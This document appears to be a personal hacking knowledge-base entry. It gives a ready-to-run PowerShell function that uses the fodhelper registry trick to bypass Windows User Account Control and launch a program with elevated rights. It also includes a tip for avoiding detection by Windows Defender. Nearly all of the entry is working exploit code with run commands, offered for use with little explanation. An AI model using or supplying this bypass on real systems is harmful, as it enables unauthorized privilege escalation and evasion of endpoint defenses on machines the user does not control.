# bypass UAC with administrators group fodhelper bypass
~/kb/hacking/windows/uacbypass/fodhelper.ps1
pass in argument to `-program` or it gets detected by windows defender trying to spawn powershell. use cmd within interactive gui session.

https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
```powershell
function FodhelperBypass(){ 
 
Param (    
 
 [String]$program = "cmd /c start powershell.exe" #default
 
      )
 
#Create registry structure
 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
#Perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
#Remove registry structure
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
}

# run it
FodhelperBypass -program cmd
FodhelperBypass
```

# Related
- [20221003151064](/zet/20221003151064/README.md) bypass UAC with administrators group
- ~/kb/hacking/windows/uacbypass/uac-bypass.md

Tags:
    #assorted #hacking #windows #uac
